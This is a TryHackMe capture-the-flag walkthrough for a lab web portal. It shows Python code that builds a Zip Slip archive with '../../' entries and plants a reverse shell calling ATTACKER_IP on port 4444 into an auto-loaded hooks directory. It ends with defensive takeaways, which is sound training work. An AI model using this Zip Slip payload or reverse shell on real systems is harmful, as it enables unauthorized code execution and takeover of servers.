---
title: "TryHackMe - Byte Lotus: The Hollow Shell"
date: 2026-08-06
tags: ["TryHackMe", "Web Security", "Zip Slip", "File Upload", "RCE"]
excerpt: "A beachfront tablet-theming portal accepts a little too much trust in its ZIP uploads — path traversal during extraction plants a Python plugin exactly where the app auto-loads it."
---

# TryHackMe: Byte Lotus — The Hollow Shell

**Room theme:** The Shoreline Display portal, a staff tool for personalizing in-room tablets with themed "shells" — ZIP souvenir packs containing a manifest and some assets. The room's own hint is a pun worth taking literally: "slip past what the portal forgets to check, and the shell answers with a shell of your own."

**Objective:** Find the flag.

## Recon

```
nmap -p- -sV -sC -T4 <target>
```

SSH plus a Flask/gunicorn app on port 5000, redirecting to `/login`.

## Hardcoded credentials, again

View-source on the login page turns up the same pattern seen elsewhere on this property — a comment with a starter account IT never got around to rotating:

```html
<!--
  New on the floor team? IT seeds every property with the same
  starter login until you set your own:
      user: concierge
      pass: StayNoticed2024!
-->
```

Logging in drops straight into a dashboard with a single feature: upload a `.zip` "shell" containing a `shell.json` manifest and some assets (images, stylesheets) to theme the property's tablets.

## Mapping the upload feature

A minimal valid shell:

```json
{"name": "test", "assets": ["style.css"]}
```

zipped up alongside `style.css` and posted to `/upload` gets accepted and shows up on the dashboard, served back from a per-upload directory: `/shells/<id>/<filename>`.

The dashboard copy calls out two things worth chasing: an "allowed asset types" list (`png jpg gif svg css json`), and an "automation hooks" feature that a background "theme worker" applies to each shell shortly after it comes ashore.

## Confirming Zip Slip

Testing whether the extraction process actually respects the zip's internal paths is the natural next move for any archive-upload feature. Python's `zipfile` module (unlike the command-line `zip` tool) will happily write path-traversal sequences into an archive's entry names:

```python
import zipfile
with zipfile.ZipFile('slip.zip', 'w') as z:
    z.writestr('shell.json', '{"name":"sliptest","assets":["style.css"]}')
    z.writestr('style.css', 'body{background:#fff}')
    z.writestr('../../static/slipproof.txt', 'zipslip-worked')
```

Uploading this and then fetching `/static/slipproof.txt` returns `zipslip-worked` — confirmed arbitrary file write, escaping well outside the intended per-shell extraction folder. Further testing showed the extraction routine also auto-creates any missing intermediate directories, meaning the write primitive works anywhere the app's own OS user has permission — not just into existing folders.

## From write primitive to RCE

Zip Slip alone is a write-anywhere-the-app-can-write bug; the interesting part is finding what turns that into code execution. The dashboard's own wording — "automation hooks... the theme worker applies these for you" — is the pointer: rather than a JSON field inside the manifest, the app watches a directory literally named `hooks/` at its own application root and auto-loads any Python file dropped there, plugin-style.

Since the confirmed traversal depth from the extraction directory reaches the app root at `../../`, planting a file at `../../hooks/<name>.py` lands it exactly where the worker picks it up:

```python
import zipfile, json

manifest = {"name": "reverse", "assets": []}

callback = '''
import socket, os, pty
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("ATTACKER_IP", 4444))
for fd in (0, 1, 2):
    os.dup2(sock.fileno(), fd)
pty.spawn("/bin/bash")
'''

with zipfile.ZipFile("reverse-shell.zip", "w") as z:
    z.writestr("shell.json", json.dumps(manifest))
    z.writestr("../../hooks/callback.py", callback)
```

With a `nc -lvnp 4444` listener running and this zip uploaded, the worker imports the dropped file and executes it — a full Python reverse shell, no manifest reference to the hook file needed at all; simply existing under `hooks/` with a `.py` extension is enough.

## Shell access

```
Connection received on <target> ...
roomservice@tryhackme-2404:/var/www/conch$
```

Landed as `roomservice`, the app's own service account.

## The flag

```
find / -iname "*flag*" -not -path "/proc/*" 2>/dev/null
```

```
/home/roomservice/flag.txt
```

```
cat /home/roomservice/flag.txt
```

```
THM{xxx}
```

## Takeaways

- Never trust an archive's internal file paths during extraction. Python's `zipfile.extractall()` (and the equivalent in most languages) does not sanitize `../` sequences by default — always resolve extracted paths against the intended base directory and reject anything that escapes it.
- A feature description ("automation hooks") is often a direct hint about *implementation*, not just marketing copy — when a write primitive is confirmed, it's worth testing every literal noun the app uses as a possible directory or filename convention, not just as a JSON field name.
- Plugin-style auto-loaders that `import`/`exec` any file dropped into a watched directory are extremely dangerous once combined with any kind of arbitrary file write, however indirect — the write doesn't need to target something the developer intended to be "code" for it to become exactly that.
- Hardcoded demo credentials left in HTML comments continue to be one of the most reliable first footholds across this entire property — always view-source before trying anything more elaborate.